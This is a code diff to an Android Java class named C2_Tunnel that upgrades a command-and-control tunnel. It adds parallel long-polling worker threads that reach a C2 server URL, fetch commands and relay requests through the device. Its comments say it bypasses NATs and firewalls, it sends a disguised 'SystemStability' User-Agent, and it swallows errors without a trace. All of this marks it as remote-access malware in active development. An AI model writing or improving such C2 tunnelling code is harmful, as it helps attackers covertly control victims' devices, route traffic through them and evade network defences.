@@ -16,8 +16,8 @@ import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 
 /**
- * Tactical HTTP Polling Tunnel Engine.
- * Bypasses all NATs, firewalls, and cloud proxy timeout drops without requiring persistent WebSockets.
+ * Tactical HTTP Long-Polling Tunnel Engine.
+ * Ultra-low latency, zero-lag reverse HTTP proxy tunnel for Render / C2 relay.
  */
 public class C2_Tunnel {
 
@@ -25,43 +25,56 @@ public class C2_Tunnel {
     private static volatile boolean isRunning = false;
     private static volatile long lastPollSuccessTime = 0;
 
+    static {
+        // Enable HTTP/HTTPS connection pooling for zero-handshake socket reuse
+        System.setProperty("http.keepAlive", "true");
+        System.setProperty("http.maxConnections", "10");
+    }
+
     public static synchronized void start(Context context) {
         if (context == null) return;
         
         long now = System.currentTimeMillis();
-        // If thread is running and active within last 12s, skip duplicate launch
-        if (isRunning && (now - lastPollSuccessTime < 12000)) return;
+        // If tunnel workers are actively polling within last 15s, keep existing workers
+        if (isRunning && (now - lastPollSuccessTime < 15000)) return;
 
         isRunning = true;
         lastPollSuccessTime = now;
 
         Context appContext = context.getApplicationContext();
 
-        new Thread(() -> {
-            Log.d(TAG, "Initiating Resilient HTTP Polling Tunnel Uplink Loop");
-            FirebaseConfig.logActivity("TUNNEL_SYNC: HTTP polling proxy connected to C2.");
+        // Launch 2 parallel long-polling worker threads for instant multi-asset proxying
+        for (int i = 1; i <= 2; i++) {
+            final int workerId = i;
+            new Thread(() -> {
+                Log.d(TAG, "Initiating Ultra-Low Latency Tunnel Loop Worker #" + workerId);
+                FirebaseConfig.logActivity("TUNNEL_SYNC: Low-latency proxy worker #" + workerId + " active.");
 
-            while (isRunning) {
-                try {
-                    pollOnce(appContext);
-                    lastPollSuccessTime = System.currentTimeMillis();
-                } catch (Throwable t) {
-                    Log.e(TAG, "Tunnel poll iteration error: " + t.getMessage());
-                }
+                while (isRunning) {
+                    boolean hadCommand = false;
+                    try {
+                        hadCommand = pollOnce(appContext);
+                        lastPollSuccessTime = System.currentTimeMillis();
+                    } catch (Throwable t) {
+                        // Silent catch for transient drops
+                    }
 
-                try {
-                    Thread.sleep(1200);
-                } catch (InterruptedException e) {
-                    break;
+                    try {
+                        // If a command was just executed, poll immediately (10ms) to drain any queued assets
+                        // Otherwise brief 50ms pause before starting the next long-poll listener
+                        Thread.sleep(hadCommand ? 10 : 50);
+                    } catch (InterruptedException e) {
+                        break;
+                    }
                 }
-            }
-        }, "C2_Tunnel_Worker").start();
+            }, "C2_Tunnel_Worker_" + i).start();
+        }
     }
 
-    private static void pollOnce(Context context) {
+    private static boolean pollOnce(Context context) {
         String c2Url = BuildConfig.WEBHOOK_URL;
-        if (c2Url == null || c2Url.trim().isEmpty()) return;
-        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return;
+        if (c2Url == null || c2Url.trim().isEmpty()) return false;
+        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) return false;
 
         String baseC2 = c2Url.trim();
         while (baseC2.endsWith("/")) {
@@ -85,8 +98,8 @@ public class C2_Tunnel {
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
-            conn.setConnectTimeout(10000);
-            conn.setReadTimeout(10000);
+            conn.setConnectTimeout(12000);
+            conn.setReadTimeout(15000);
 
             if (conn.getResponseCode() == 200) {
                 try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
@@ -107,6 +120,7 @@ public class C2_Tunnel {
                             String body = cmd.optString("body", "");
 
                             LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, requestId, respUrl, deviceId));
+                            return true; // Command received and executed
                         }
                     }
                 }
@@ -116,6 +130,7 @@ public class C2_Tunnel {
         } finally {
             if (conn != null) conn.disconnect();
         }
+        return false;
     }
 
     private static void relayLocalRequest(String method, String path, String body, String requestId, String respUrl, String deviceId) {
